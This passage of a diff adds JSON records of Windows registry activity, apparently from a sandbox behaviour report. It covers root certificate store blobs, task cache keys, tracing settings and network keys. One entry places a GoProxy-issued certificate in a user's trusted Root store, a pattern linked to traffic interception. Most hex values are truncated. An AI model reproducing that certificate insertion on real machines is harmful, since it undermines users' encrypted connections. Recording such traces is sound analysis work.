+      "value": "7E 00 00 00 01 00 00 00 08 00 00 00 00 C0 01 B3 96 67 D6 01 09 00 00 00 01 00 00 00 3E 00 00 00 30 3C 06 08 2B 06 01 05 05 07 03 02 06 08 2B 06 01 05 05 07 03 03 06 08 2B 06 01 05 05 07 03 04 06 08 2B 06 01 05 05 07 03 09 06 08 2B 06 01 05 05 07 03 01 06 08 2B 06 01 05 05 07 03 08 5C 00 00 00 01 00 00 00 04 00 00 00 00 08 00 00 0F 00 00 00 01 00 00 00 14 00 00 00 CE 0E 65 8A A3 E8 47 E4 67 A1 47 B3 04 91 91 09 3D 05 5E 6F 0B 00 00 00 01 00 00 00 30 00 00 00 44 00 69 00 67 00 69 00 43 00 65 00 72 00 74 00 20 00 42 00 61 00 6C 00 74 00 69 00 6D 00 6F 00 72 00 65 00 20 00 52 00 6F 00 6F 00 74 00 00 00 62 00 00 00 01 00 00 00 20 00 00 00 16 AF 57 A9 F6 76 B0 AB 12 60 95 AA 5E BA DE F2 2A B3 11 19 D6 44 AC 95 CD 4B 93 DB F3 F2 6A EB 14 00 00 00 01 00 00 00 14 00 00 00 E5 9D 59 30 82 47 58 CC AC FA 08 54 36 86 7B 3A B5 04 4D F0 1D 00 00 00 01 00 00 00 10 00 00 00 91 8A D4 3A 94 75 F7 8B B5 24 3D E8 86 D8 10 3C 03 00 00 00 01 00 00 00 14 00 00 00 D4 DE 20 D0 5E 66 FC 53 FE 1A 50 88 2C 78 DB 28 52 CA E4 74 19 00 00 0"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\D69B561148F01C77C54578C10926DF5B856976AD\\Blob",
+      "value": "53 00 00 00 01 00 00 00 40 00 00 00 30 3E 30 1F 06 09 2B 06 01 04 01 A0 32 01 01 30 12 30 10 06 0A 2B 06 01 04 01 82 37 3C 01 01 03 02 00 C0 30 1B 06 05 67 81 0C 01 03 30 12 30 10 06 0A 2B 06 01 04 01 82 37 3C 01 01 03 02 00 C0 5C 00 00 00 01 00 00 00 04 00 00 00 00 08 00 00 19 00 00 00 01 00 00 00 10 00 00 00 D0 FD 3C 9C 38 0D 7B 65 E2 6B 9A 3F ED D3 9B 8F 03 00 00 00 01 00 00 00 14 00 00 00 D6 9B 56 11 48 F0 1C 77 C5 45 78 C1 09 26 DF 5B 85 69 76 AD 1D 00 00 00 01 00 00 00 10 00 00 00 01 72 8E 1E CF 7A 9D 86 FB 3C EC 89 48 AB A9 53 14 00 00 00 01 00 00 00 14 00 00 00 8F F0 4B 7F A8 2E 45 24 AE 4D 50 FA 63 9A 8B DE E2 DD 1B BC 62 00 00 00 01 00 00 00 20 00 00 00 CB B5 22 D7 B7 F1 27 AD 6A 01 13 86 5B DF 1C D4 10 2E 7D 07 59 AF 63 5A 7C F4 72 0D C9 63 C5 3B 0B 00 00 00 01 00 00 00 30 00 00 00 47 00 6C 00 6F 00 62 00 61 00 6C 00 53 00 69 00 67 00 6E 00 20 00 52 00 6F 00 6F 00 74 00 20 00 43 00 41 00 20 00 2D 00 20 00 52 00 33 00 00 00 0F 00 00 00 01 00 00 00 20 00 00 00 52 29 BA 15 B3 1B 0C 6F 4C CA 89 C2 98 5"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\2796BAE63F1801E277261BA0D77770028F20EEE4\\Blob",
+      "value": "09 00 00 00 01 00 00 00 2A 00 00 00 30 28 06 08 2B 06 01 05 05 07 03 02 06 08 2B 06 01 05 05 07 03 03 06 08 2B 06 01 05 05 07 03 04 06 08 2B 06 01 05 05 07 03 01 04 00 00 00 01 00 00 00 10 00 00 00 91 DE 06 25 AB DA FD 32 17 0C BB 25 17 2A 84 67 0F 00 00 00 01 00 00 00 14 00 00 00 5D 82 AD B9 0D 5D D3 C7 E3 52 4F 56 F7 87 EC 53 72 61 87 76 0B 00 00 00 01 00 00 00 52 00 00 00 47 00 6F 00 20 00 44 00 61 00 64 00 64 00 79 00 20 00 43 00 6C 00 61 00 73 00 73 00 20 00 32 00 20 00 43 00 65 00 72 00 74 00 69 00 66 00 69 00 63 00 61 00 74 00 69 00 6F 00 6E 00 20 00 41 00 75 00 74 00 68 00 6F 00 72 00 69 00 74 00 79 00 00 00 53 00 00 00 01 00 00 00 48 00 00 00 30 46 30 21 06 0B 60 86 48 01 86 FD 6D 01 07 17 03 30 12 30 10 06 0A 2B 06 01 04 01 82 37 3C 01 01 03 02 00 C0 30 21 06 0B 60 86 48 01 86 FD 6E 01 07 17 03 30 12 30 10 06 0A 2B 06 01 04 01 82 37 3C 01 01 03 02 00 C0 62 00 00 00 01 00 00 00 20 00 00 00 C3 84 6B F2 4B 9E 93 CA 64 27 4C 0E C6 7C 1E CC 5E 02 4F FC AC D2 D7 40 19 35 0E 81 FE 54 6A E4 14 00 00 00 01 0"
+    },
+    {
+      "key": "HKU\\S-1-5-21-575823232-3065301323-1442773979-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\\\AutoDetect",
+      "value": "1"
+    },
+    {
+      "key": "HKU\\S-1-5-21-575823232-3065301323-1442773979-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\\\UNCAsIntranet",
+      "value": "0"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\IndexTable\\FileIdIndex-{853201e6-2d75-11ea-a138-806e6f6e6963}\\_IndexName_"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\75E0ABB6138512271C04F85FDDDE38E4B7242EFE\\Blob",
+      "value": "7E 00 00 00 01 00 00 00 08 00 00 00 00 00 CF 97 A7 37 D6 01 7F 00 00 00 01 00 00 00 16 00 00 00 30 14 06 08 2B 06 01 05 05 07 03 03 06 08 2B 06 01 05 05 07 03 09 09 00 00 00 01 00 00 00 68 00 00 00 30 66 06 08 2B 06 01 05 05 07 03 02 06 08 2B 06 01 05 05 07 03 03 06 0A 2B 06 01 04 01 82 37 0A 03 04 06 08 2B 06 01 05 05 07 03 04 06 08 2B 06 01 05 05 08 02 02 06 08 2B 06 01 05 05 07 03 06 06 08 2B 06 01 05 05 07 03 07 06 08 2B 06 01 05 05 07 03 09 06 08 2B 06 01 05 05 07 03 01 06 08 2B 06 01 05 05 07 03 08 04 00 00 00 01 00 00 00 10 00 00 00 94 14 77 7E 3E 5E FD 8F 30 BD 41 B0 CF E7 D0 30 0F 00 00 00 01 00 00 00 14 00 00 00 BF 4D 2C 39 0B BF 0A A3 A2 B7 EA 2D C7 51 01 1B F5 FD 42 2E 0B 00 00 00 01 00 00 00 5C 00 00 00 47 00 6F 00 6F 00 67 00 6C 00 65 00 20 00 54 00 72 00 75 00 73 00 74 00 20 00 53 00 65 00 72 00 76 00 69 00 63 00 65 00 73 00 20 00 2D 00 20 00 47 00 6C 00 6F 00 62 00 61 00 6C 00 53 00 69 00 67 00 6E 00 20 00 52 00 6F 00 6F 00 74 00 20 00 43 00 41 00 2D 00 52 00 32 00 00 00 62 00 00 00 01 00 00 0"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\663\\_FileId_"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\663\\_ObjectLru_"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\663\\_Usn_"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\663\\_ObjectId_"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\663\\AeFileID"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\663\\_UsnJournalId_"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\663\\AeProgramID"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\662\\_FileId_"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\662\\_ObjectLru_"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\662\\_Usn_"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\662\\_ObjectId_"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\662\\AeFileID"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\662\\_UsnJournalId_"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\662\\AeProgramID"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\661\\_FileId_"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\661\\_ObjectLru_"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\661\\_Usn_"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\661\\_ObjectId_"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\661\\AeFileID"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\661\\_UsnJournalId_"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\661\\AeProgramID"
+    },
+    {
+      "key": "HKU\\S-1-5-21-575823232-3065301323-1442773979-1000\\Software\\Microsoft\\SystemCertificates\\Root\\Certificates\\0174E68C97DDF1E0EEEA415EA336A163D2B61AFD\\Blob",
+      "value": "5C 00 00 00 01 00 00 00 04 00 00 00 00 10 00 00 04 00 00 00 01 00 00 00 10 00 00 00 0D BE 92 DE FF 7D 36 BB 48 C4 A6 B1 15 24 95 38 0F 00 00 00 01 00 00 00 20 00 00 00 53 FE B9 19 2E D4 80 F2 09 12 4A 2C 57 D7 E8 97 7A 2E 9F 39 46 1D BF 21 4D F1 12 CB 16 02 4F A2 14 00 00 00 01 00 00 00 14 00 00 00 78 B8 30 FD 63 AC 7B 89 4A 07 3B ED F6 8A 83 9C C3 52 02 65 19 00 00 00 01 00 00 00 10 00 00 00 B5 74 AF 30 C5 C1 BA 3A 69 A7 10 02 00 82 4D D0 03 00 00 00 01 00 00 00 14 00 00 00 01 74 E6 8C 97 DD F1 E0 EE EA 41 5E A3 36 A1 63 D2 B6 1A FD 20 00 00 00 01 00 00 00 F8 05 00 00 30 82 05 F4 30 82 03 DC A0 03 02 01 02 02 09 00 E0 EA 61 4C 28 56 32 64 30 0D 06 09 2A 86 48 86 F7 0D 01 01 0B 05 00 30 81 8E 31 0B 30 09 06 03 55 04 06 13 02 49 4C 31 0F 30 0D 06 03 55 04 08 0C 06 43 65 6E 74 65 72 31 0C 30 0A 06 03 55 04 07 0C 03 4C 6F 64 31 10 30 0E 06 03 55 04 0A 0C 07 47 6F 50 72 6F 78 79 31 10 30 0E 06 03 55 04 0B 0C 07 47 6F 50 72 6F 78 79 31 1A 30 18 06 03 55 04 03 0C 11 67 6F 70 72 6F 78 79 2E 67 69 74 68 75 62 2E 69 6"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\590D2D7D884F402E617EA562321765CF17D894E9\\Blob",
+      "value": "09 00 00 00 01 00 00 00 20 00 00 00 30 1E 06 08 2B 06 01 05 05 07 03 02 06 08 2B 06 01 05 05 07 03 04 06 08 2B 06 01 05 05 07 03 01 04 00 00 00 01 00 00 00 10 00 00 00 2B 9B 9E E4 7B 6C 1F 00 72 1A CC C1 77 79 DF 6A 0F 00 00 00 01 00 00 00 20 00 00 00 56 8B 40 EB 6F 00 6B 46 50 7D A6 36 7D 04 6B 6B 3E 31 7C 83 41 45 95 E7 86 E4 84 07 F4 12 6F 3E 0B 00 00 00 01 00 00 00 3A 00 00 00 54 00 2D 00 54 00 65 00 6C 00 65 00 53 00 65 00 63 00 20 00 47 00 6C 00 6F 00 62 00 61 00 6C 00 52 00 6F 00 6F 00 74 00 20 00 43 00 6C 00 61 00 73 00 73 00 20 00 32 00 00 00 62 00 00 00 01 00 00 00 20 00 00 00 91 E2 F5 78 8D 58 10 EB A7 BA 58 73 7D E1 54 8A 8E CA CD 01 45 98 BC 0B 14 3E 04 1B 17 05 25 52 14 00 00 00 01 00 00 00 14 00 00 00 BF 59 20 36 00 79 A0 A0 22 6B 8C D5 F2 61 D2 B8 2C CB 82 4A 1D 00 00 00 01 00 00 00 10 00 00 00 BB 93 63 D0 A9 9E D5 FF 02 73 2E 4F C0 42 63 0C 03 00 00 00 01 00 00 00 14 00 00 00 59 0D 2D 7D 88 4F 40 2E 61 7E A5 62 32 17 65 CF 17 D8 94 E9 19 00 00 00 01 00 00 00 10 00 00 00 3F 83 9D 9F FA 39 99 B"
+    },
+    {
+      "key": "\\\\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones\\Middle East Standard Time\\TZI"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\_CurrentObjectId_"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\CABD2A79A1076A31F21D253635CB039D4329A5E8\\Blob",
+      "value": "19 00 00 00 01 00 00 00 10 00 00 00 2F E1 F7 0B B0 5D 7C 92 33 5B C5 E0 5B 98 4D A6 03 00 00 00 01 00 00 00 14 00 00 00 CA BD 2A 79 A1 07 6A 31 F2 1D 25 36 35 CB 03 9D 43 29 A5 E8 1D 00 00 00 01 00 00 00 10 00 00 00 73 B6 87 61 95 F5 D1 8E 04 85 10 42 2A EF 04 E3 14 00 00 00 01 00 00 00 14 00 00 00 79 B4 59 E6 7B B6 E5 E4 01 73 80 08 88 C8 1A 58 F6 E9 9B 6E 09 00 00 00 01 00 00 00 16 00 00 00 30 14 06 08 2B 06 01 05 05 07 03 02 06 08 2B 06 01 05 05 07 03 01 0B 00 00 00 01 00 00 00 1A 00 00 00 49 00 53 00 52 00 47 00 20 00 52 00 6F 00 6F 00 74 00 20 00 58 00 31 00 00 00 62 00 00 00 01 00 00 00 20 00 00 00 96 BC EC 06 26 49 76 F3 74 60 77 9A CF 28 C5 A7 CF E8 A3 C0 AA E1 1A 8F FC EE 05 C0 BD DF 08 C6 0F 00 00 00 01 00 00 00 20 00 00 00 3F 04 11 ED E9 C4 47 70 57 D5 7E 57 88 3B 1F 20 5B 20 CD C0 F3 26 31 29 B1 EE 02 69 A2 67 8F 63 20 00 00 00 01 00 00 00 6F 05 00 00 30 82 05 6B 30 82 03 53 A0 03 02 01 02 02 11 00 82 10 CF B0 D2 40 E3 59 44 63 E0 BB 63 82 8B 00 30 0D 06 09 2A 86 48 86 F7 0D 01 01 0B 05 00 30 4F 3"
+    },
+    {
+      "key": "HKU\\S-1-5-18\\Software\\Classes\\Local Settings\\MuiCache\\17b\\52C64B7E\\LanguageList",
+      "value": "en-US\nen\n"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436\\Blob",
+      "value": "7E 00 00 00 01 00 00 00 08 00 00 00 00 80 C8 2B 68 86 D7 01 09 00 00 00 01 00 00 00 34 00 00 00 30 32 06 08 2B 06 01 05 05 07 03 02 06 08 2B 06 01 05 05 07 03 03 06 08 2B 06 01 05 05 07 03 04 06 08 2B 06 01 05 05 07 03 01 06 08 2B 06 01 05 05 07 03 08 5C 00 00 00 01 00 00 00 04 00 00 00 00 08 00 00 19 00 00 00 01 00 00 00 10 00 00 00 0F 3A 05 27 D2 42 DE 2D C9 8E 5C FC B1 E9 91 EE 03 00 00 00 01 00 00 00 14 00 00 00 A8 98 5D 3A 65 E5 E5 C4 B2 D7 D6 6D 40 C6 DD 2F B1 9C 54 36 1D 00 00 00 01 00 00 00 10 00 00 00 59 77 9E 39 E2 1A 2E 3D FC ED 68 57 ED 5C 5F D9 0B 00 00 00 01 00 00 00 12 00 00 00 44 00 69 00 67 00 69 00 43 00 65 00 72 00 74 00 00 00 14 00 00 00 01 00 00 00 14 00 00 00 03 DE 50 35 56 D1 4C BB 66 F0 A3 E2 1B 1B C3 97 B2 3D D1 55 62 00 00 00 01 00 00 00 20 00 00 00 43 48 A0 E9 44 4C 78 CB 26 5E 05 8D 5E 89 44 B4 D8 4F 96 62 BD 26 DB 25 7F 89 34 A4 43 C7 01 61 0F 00 00 00 01 00 00 00 14 00 00 00 B3 4D DD 37 2E D9 2E 8F 2A BF BB 9E 20 A9 D3 1F 20 4F 19 4B 04 00 00 00 01 00 00 00 10 00 00 00 79 E4 A9 8"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\LruList\\0000000000002B6D\\ObjectLru"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\LruList\\0000000000002B6D\\ObjectId"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\IndexTable\\FileIdIndex-{853201e6-2d75-11ea-a138-806e6f6e6963}\\2000000000050F\\661"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5\\Blob",
+      "value": "7E 00 00 00 01 00 00 00 08 00 00 00 00 C0 03 2F 2D F8 D6 01 7F 00 00 00 01 00 00 00 2A 00 00 00 30 28 06 08 2B 06 01 05 05 07 03 02 06 08 2B 06 01 05 05 07 03 03 06 08 2B 06 01 05 05 07 03 04 06 08 2B 06 01 05 05 07 03 01 5C 00 00 00 01 00 00 00 04 00 00 00 00 08 00 00 19 00 00 00 01 00 00 00 10 00 00 00 D8 B5 FB 36 84 68 62 02 75 D1 42 FF D2 AA DE 37 03 00 00 00 01 00 00 00 14 00 00 00 4E B6 D5 78 49 9B 1C CF 5F 58 1E AD 56 BE 3D 9B 67 44 A5 E5 1D 00 00 00 01 00 00 00 10 00 00 00 C6 CB CA FA 17 95 5C 4C FD 41 EC A0 C6 54 C3 61 0B 00 00 00 01 00 00 00 12 00 00 00 56 00 65 00 72 00 69 00 53 00 69 00 67 00 6E 00 00 00 14 00 00 00 01 00 00 00 14 00 00 00 7F D3 65 A7 C2 DD EC BB F0 30 09 F3 43 39 FA 02 AF 33 31 33 62 00 00 00 01 00 00 00 20 00 00 00 9A CF AB 7E 43 C8 D8 80 D0 6B 26 2A 94 DE EE E4 B4 65 99 89 C3 D0 CA F1 9B AF 64 05 E4 1A B7 DF 0F 00 00 00 01 00 00 00 14 00 00 00 E9 1E 1E 97 2B 8F 46 7A B4 E0 59 8F A9 22 85 38 7D EE 94 C9 04 00 00 00 01 00 00 00 10 00 00 00 CB 17 E4 31 67 3E E2 09 FE 45 57 93 F3 0"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\LruList\\0000000000002B6A\\ObjectLru"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\LruList\\0000000000002B6A\\ObjectId"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\IndexTable\\FileIdIndex-{853201e6-2d75-11ea-a138-806e6f6e6963}\\100000001E755\\662"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\661\\Indexes\\FileIdIndex-{853201e6-2d75-11ea-a138-806e6f6e6963}\\2000000000050F"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\662\\Indexes\\FileIdIndex-{853201e6-2d75-11ea-a138-806e6f6e6963}\\100000001E755"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\AD7E1C28B064EF8F6003402014C3D0E3370EB58A\\Blob",
+      "value": "09 00 00 00 01 00 00 00 2A 00 00 00 30 28 06 08 2B 06 01 05 05 07 03 02 06 08 2B 06 01 05 05 07 03 03 06 08 2B 06 01 05 05 07 03 04 06 08 2B 06 01 05 05 07 03 01 04 00 00 00 01 00 00 00 10 00 00 00 32 4A 4B BB C8 63 69 9B BE 74 9A C6 DD 1D 46 24 0F 00 00 00 01 00 00 00 14 00 00 00 0F 6A AD 4C 3F E0 46 19 CD C8 B2 BD 65 5A A1 A2 60 42 E6 50 0B 00 00 00 01 00 00 00 54 00 00 00 53 00 74 00 61 00 72 00 66 00 69 00 65 00 6C 00 64 00 20 00 43 00 6C 00 61 00 73 00 73 00 20 00 32 00 20 00 43 00 65 00 72 00 74 00 69 00 66 00 69 00 63 00 61 00 74 00 69 00 6F 00 6E 00 20 00 41 00 75 00 74 00 68 00 6F 00 72 00 69 00 74 00 79 00 00 00 53 00 00 00 01 00 00 00 48 00 00 00 30 46 30 21 06 0B 60 86 48 01 86 FD 6D 01 07 17 03 30 12 30 10 06 0A 2B 06 01 04 01 82 37 3C 01 01 03 02 00 C0 30 21 06 0B 60 86 48 01 86 FD 6E 01 07 17 03 30 12 30 10 06 0A 2B 06 01 04 01 82 37 3C 01 01 03 02 00 C0 62 00 00 00 01 00 00 00 20 00 00 00 14 65 FA 20 53 97 B8 76 FA A6 F0 A9 95 8E 55 90 E4 0F CC 7F AA 4F B7 C2 C8 67 75 21 FB 5F B6 58 14 00 00 0"
+    },
+    {
+      "key": "\\\\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones\\Greenland Standard Time\\TZI"
+    },
+    {
+      "key": "HKU\\S-1-5-21-575823232-3065301323-1442773979-1000_CLASSES\\Local Settings\\MuiCache\\17b\\52C64B7E\\LanguageList",
+      "value": "en-US\nen\n"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\IndexTable\\FileIdIndex-{853201e6-2d75-11ea-a138-806e6f6e6963}\\3000000000061F\\663"
+    },
+    {
+      "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\BITS\\StateIndex",
+      "value": "1"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\LruList\\CurrentLru"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\ObjectTable\\663\\Indexes\\FileIdIndex-{853201e6-2d75-11ea-a138-806e6f6e6963}\\3000000000061F"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\Tracing\\svchost64_RASAPI32\\FileDirectory",
+      "value": "%windir%\\tracing"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\Tracing\\svchost64_RASAPI32\\MaxFileSize",
+      "value": "1048576"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\Tracing\\svchost64_RASAPI32\\ConsoleTracingMask",
+      "value": "4294901760"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\Tracing\\svchost64_RASAPI32\\FileTracingMask",
+      "value": "4294901760"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\Tracing\\svchost64_RASAPI32\\EnableConsoleTracing",
+      "value": "0"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\Tracing\\svchost64_RASAPI32\\EnableFileTracing",
+      "value": "0"
+    },
+    {
+      "key": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{875AD87C-FB4E-42F3-A09C-40EBFE1BC853}\\DynamicInfo"
+    },
+    {
+      "key": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{875AD87C-FB4E-42F3-A09C-40EBFE1BC853}\\Path"
+    },
+    {
+      "key": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{875AD87C-FB4E-42F3-A09C-40EBFE1BC853}\\Hash"
+    },
+    {
+      "key": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{875AD87C-FB4E-42F3-A09C-40EBFE1BC853}\\Triggers"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\LruList\\0000000000002B67\\ObjectLru"
+    },
+    {
+      "key": "\\\\REGISTRY\\A\\{de1dc1b3-9e91-11ea-b112-167c9a143b07}\\DefaultObjectStore\\LruList\\0000000000002B67\\ObjectId"
+    },
+    {
+      "key": "\\\\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones\\Paraguay Standard Time\\TZI"
+    },
+    {
+      "key": "HKLM\\SYSTEM\\ControlSet001\\Control\\Nsi\\{eb004a03-9b1a-11d4-9123-0050047759bc}\\22\\(Default)"
+    },
+    {
+      "key": "HKLM\\SYSTEM\\ControlSet001\\Control\\Nsi\\{eb004a03-9b1a-11d4-9123-0050047759bc}\\24\\ffffffffffffffffffffffffffffff00",
+      "value": "00 00 00 00 00 00 00 00 00 00 00 00 FF FF FF FF FF FF FF FF FF FF FF FF"
+    },
+    {
+      "key": "HKLM\\SYSTEM\\ControlSet001\\Control\\Nsi\\{eb004a03-9b1a-11d4-9123-0050047759bc}\\24\\ffffffffffffffffffffffffffffff01",
+      "value": "00 00 00 00 6D 00 00 00 19 00 00 00 FF FF FF FF FF FF FF FF FF FF FF FF"
+    },
+    {
+      "key": "HKLM\\SYSTEM\\ControlSet001\\Control\\Nsi\\{eb004a03-9b1a-11d4-9123-0050047759bc}\\24\\ffffffffffffffffffffffffffffff02",
+      "value": "01 00 00 00 5A 00 00 00 D6 17 00 00 FF FF FF FF FF FF FF FF FF FF FF FF"
+    },
+    {
+      "key": "HKLM\\SYSTEM\\ControlSet001\\Control\\Nsi\\{eb004a03-9b1a-11d4-9123-0050047759bc}\\24\\ffffffffffffffffffffffffffffff03",
+      "value": "00 00 00 00 00 00 00 00 00 00 00 00 FF FF FF FF FF FF FF FF FF FF FF FF"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\AutoUpdate\\LastSyncTime",
+      "value": "F6 72 75 AB 93 B7 D7 01"
+    },
+    {
+      "key": "HKLM\\Software\\Microsoft\\SystemCertificates\\AuthRoot\\AutoUpdate\\EncodedCtl",
+      "value": "30 83 02 74 EA 06 09 2A 86 48 86 F7 0D 01 07 02 A0 83 02 74 DA 30 83 02 74 D5 02 01 01 31 0F 30 0D 06 09 60 86 48 01 65 03 04 02 01 05 00 30 83 02 64 E9 06 09 2B 06 01 04 01 82 37 0A 01 A0 83 02 64 D9 30 83 02 64 D4 30 0C 06 0A 2B 06 01 04 01 82 37 0A 03 09 02 09 14 01 D7 A6 5E 3C 17 71 93 17 0D 32 31 30 39 31 30 31 36 30 39 32 39 5A 30 09 06 05 2B 0E 03 02 1A 05 00 30 83 02 64 9C 30 82 01 44 04 14 CD D4 EE AE 60 00 AC 7F 40 C3 80 2C 17 1E 30 14 80 30 C0 72 31 82 01 2A 30 18 06 0A 2B 06 01 04 01 82 37 0A 0B 68 31 0A 04 08 00 80 C8 2B 68 86 D7 01 30 18 06 0A 2B 06 01 04 01 82 37 0A 0B 7E 31 0A 04 08 00 00 D9 B5 44 C1 D2 01 30 1E 06 0A 2B 06 01 04 01 82 37 0A 0B 69 31 10 04 0E 30 0C 06 0A 2B 06 01 04 01 82 37 3C 03 02 30 20 06 0A 2B 06 01 04 01 82 37 0A 0B 1D 31 12 04 10 F0 C4 02 F0 40 4E A9 AD BF 25 A0 3D DF 2C 